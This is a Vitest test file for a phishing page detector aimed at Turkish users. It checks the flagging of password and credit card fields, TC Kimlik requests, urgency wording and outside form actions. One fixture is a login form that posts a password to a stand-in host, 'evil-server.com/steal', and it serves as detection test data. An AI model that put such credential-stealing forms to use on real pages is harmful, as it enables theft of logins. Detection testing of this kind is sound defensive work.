import { describe, it, expect } from "vitest";
import { analyzePage } from "@/detector/page-analyzer";
import { JSDOM } from "jsdom";

function createDocument(html: string): Document {
  const dom = new JSDOM(html);
  return dom.window.document;
}

describe("analyzePage", () => {
  it("should detect password fields", () => {
    const doc = createDocument(`
      <form>
        <input type="text" name="username" />
        <input type="password" name="password" />
      </form>
    `);
    const result = analyzePage(doc, "example.com");
    expect(result.hasPasswordField).toBe(true);
    expect(result.hasLoginForm).toBe(true);
  });

  it("should detect credit card fields by name", () => {
    const doc = createDocument(`
      <form>
        <input type="text" name="card_number" />
        <input type="text" name="cvv" />
      </form>
    `);
    const result = analyzePage(doc, "example.com");
    expect(result.hasCreditCardField).toBe(true);
    expect(result.reasons.some((r) => r.includes("Kredi karti"))).toBe(true);
  });

  it("should detect credit card fields by Turkish placeholder", () => {
    const doc = createDocument(`
      <form>
        <input type="text" placeholder="Kredi Kart Numarasi" />
      </form>
    `);
    const result = analyzePage(doc, "example.com");
    expect(result.hasCreditCardField).toBe(true);
  });

  it("should detect external form actions", () => {
    const doc = createDocument(`
      <form action="https://evil-server.com/steal">
        <input type="password" />
      </form>
    `);
    const result = analyzePage(doc, "example.com");
    expect(result.suspiciousFormAction).toBe(true);
    expect(result.externalFormAction).toBe("evil-server.com");
    expect(result.score).toBeGreaterThanOrEqual(30);
  });

  it("should not flag same-domain form actions", () => {
    const doc = createDocument(`
      <form action="https://example.com/login">
        <input type="password" />
      </form>
    `);
    const result = analyzePage(doc, "example.com");
    expect(result.suspiciousFormAction).toBe(false);
  });

  it("should detect TC Kimlik with sensitive fields", () => {
    const doc = createDocument(`
      <div>TC Kimlik numaranizi girin</div>
      <form>
        <input type="text" name="tckn" />
        <input type="password" name="sifre" />
      </form>
    `);
    const result = analyzePage(doc, "evil.com");
    expect(result.reasons.some((r) => r.includes("TC Kimlik"))).toBe(true);
  });

  it("should detect urgency language", () => {
    const doc = createDocument(`
      <div>Hesabiniz askiya alindi! Hemen giris yapin ve dogrulayin.</div>
      <form><input type="password" /></form>
    `);
    const result = analyzePage(doc, "evil.com");
    expect(result.reasons.some((r) => r.includes("Aciliyet"))).toBe(true);
  });

  it("should return low score for benign pages", () => {
    const doc = createDocument(`
      <h1>Hosgeldiniz</h1>
      <p>Bu normal bir sayfa</p>
    `);
    const result = analyzePage(doc, "safe.com");
    expect(result.score).toBe(0);
    expect(result.hasLoginForm).toBe(false);
    expect(result.hasPasswordField).toBe(false);
  });
});
